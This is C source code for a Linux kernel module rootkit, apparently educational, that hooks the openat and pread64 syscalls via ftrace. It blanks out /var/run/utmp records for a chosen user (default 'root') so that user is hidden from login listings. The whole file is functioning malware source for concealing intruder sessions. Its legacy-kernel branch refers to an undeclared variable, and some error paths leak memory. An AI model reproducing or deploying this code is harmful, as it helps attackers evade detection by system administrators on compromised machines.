#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "utmp.h"
#include "ftrace_helper.h"

/*
 * The username "root" can be a default
 * and hard coded value.
 */
static char *HIDDEN_USER = "root";
module_param(HIDDEN_USER, charp, S_IRUGO);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding logged in users");
MODULE_VERSION("0.01");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * This will store the file descriptor that we are going to tamper pread64()'s to
 */
int tamper_fd;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_pread64)(const struct pt_regs *);

/*
 * The hook for sys_openat()
 * We have to check which filename is being opened. If it matches "/var/run/utmp",
 * then we store the file descriptor (return value) in tamper_fd for later.
 */
asmlinkage int hook_openat(const struct pt_regs *regs)
{
    //int dfd = regs->di;
    char *filename = (char *)regs->si;
    //int flags = regs->dx;
    //umode_t mode = regs->r10;

    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    /*
     * We need a buffer to copy filename into
     */
    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL)
        return orig_openat(regs);

    /*
     * Copy filename from userspace into our kernel buffer
     */
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error)
        return orig_openat(regs);

    /*
     * Compare filename to "/var/run/utmp"
     */
    if( memcmp(kbuf, target, target_len) == 0 )
    {
        /*
         * Save the file descriptor in tamper_fd, clean up and return
         */
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }

    /*
     * Clean up and return
     */
    kfree(kbuf);
    return orig_openat(regs);
}

/*
 * The hook for sys_pread64()
 * First, we check if the file descriptor is the one stored in tamper_fd.
 * If it is, then we call the real sys_pread64(), copy the buffer into the kernel,
 * and check if the ut_user entry of the utmp struct is the user we want to hide.
 * Finally, if it matches, then we will the buffer with 0x0 before copying it back
 * to userspace and returning.
 */
asmlinkage int hook_pread64(const struct pt_regs *regs)
{
    int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    //loff_t pos = regs->r10;

    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    /*
     * Check that we're supposed to be tampering with this fd
     * Better also be sure that tamper_fd isn't 0,1, or 2!
     */
    if ( (fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) )
    {
        /*
         * Allocate a kernel buffer, and check it worked
         */
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL)
            return orig_pread64(regs);

        /*
         * Do the real syscall, so that buf gets filled for us
         */
        ret = orig_pread64(regs);

        /*
         * Copy buf into kbuf so we can look at it
         * If it fails, just return without doing anything
         */
        error = copy_from_user(kbuf, buf, count);
        if(error != 0)
            return ret;

        /*
         * Check if ut_user is the user we want to hide
         */
        utmp_buf = (struct utmp *)kbuf;
        if ( memcmp(utmp_buf->ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) == 0 )
        {
            /*
             * Overwrite kbuf with 0x0
             */
            for ( i = 0 ; i < count ; i++ )
                kbuf[i] = 0x0;

            /* 
             * Copy kbuf back to buf in userspace
             * If it fails, there's nothing we can do, so just clean up and return
             */
            error = copy_to_user(buf, kbuf, count);
            
            kfree(kbuf);
            return ret;
        }

        /*
         * We intercepted a read to /var/run/utmp, but didn't find the user
         * we want to hide, so clean up and return
         */
        kfree(kbuf);
        return ret;
    }

    /*
     * This isn't a read to /var/run/utmp, so just return
     */
    return orig_pread64(regs);
}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
static asmlinkage long (*orig_pread64)(int fd, const __user *buf, size_t count, loff_t pos);

/*
 * The hook for sys_openat()
 * We have to check which filename is being opened. If it matches "/var/run/utmp",
 * then we store the file descriptor (return value) in tamper_fd for later.
 */
static asmlinkage int hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
{
    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    /*
     * We need a buffer to copy filename into
     */
    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL)
        return orig_openat(regs);

    /*
     * Copy filename from userspace into our kernel buffer
     */
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error)
        return orig_openat(regs);

    /*
     * Compare filename to "/var/run/utmp"
     */
    if( memcmp(kbuf, target, target_len) == 0 )
    {
        /*
         * Save the file descriptor in tamper_fd, clean up and return
         */
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }

    /*
     * Clean up and return
     */
    kfree(kbuf);
    return orig_openat(regs);
}

/*
 * The hook for sys_pread64()
 * First, we check if the file descriptor is the one stored in tamper_fd.
 * If it is, then we call the real sys_pread64(), copy the buffer into the kernel,
 * and check if the ut_user entry of the utmp struct is the user we want to hide.
 * Finally, if it matches, then we will the buffer with 0x0 before copying it back
 * to userspace and returning.
 */
static asmlinkage int hook_pread64(int fd, const __user *buf, size_t count, loff_t pos)
{
    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    /*
     * Check that we're supposed to be tampering with this fd
     * Better also be sure that tamper_fd isn't 0,1, or 2!
     */
    if ( (fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) )
    {
        /*
         * Allocate a kernel buffer, and check it worked
         */
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL)
            return orig_pread64(regs);

        /*
         * Do the real syscall, so that buf gets filled for us
         */
        ret = orig_pread64(regs);

        /*
         * Copy buf into kbuf so we can look at it
         * If it fails, just return without doing anything
         */
        error = copy_from_user(kbuf, buf, count);
        if(error != 0)
            return ret;

        /*
         * Check if ut_user is the user we want to hide
         */
        utmp_buf = (struct utmp *)kbuf;
        if ( memcmp(utmp_buf->ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) == 0 )
        {
            /*
             * Overwrite kbuf with 0x0
             */
            for ( i = 0 ; i < count ; i++ )
                kbuf[i] = 0x0;

            /* 
             * Copy kbuf back to buf in userspace
             * If it fails, there's nothing we can do, so just clean up and return
             */
            error = copy_to_user(buf, kbuf, count);
            
            kfree(kbuf);
            return ret;
        }

        /*
         * We intercepted a read to /var/run/utmp, but didn't find the user
         * we want to hide, so clean up and return
         */
        kfree(kbuf);
        return ret;
    }

    /*
     * This isn't a read to /var/run/utmp, so just return
     */
    return orig_pread64(regs);
}
#endif

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_openat", hook_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
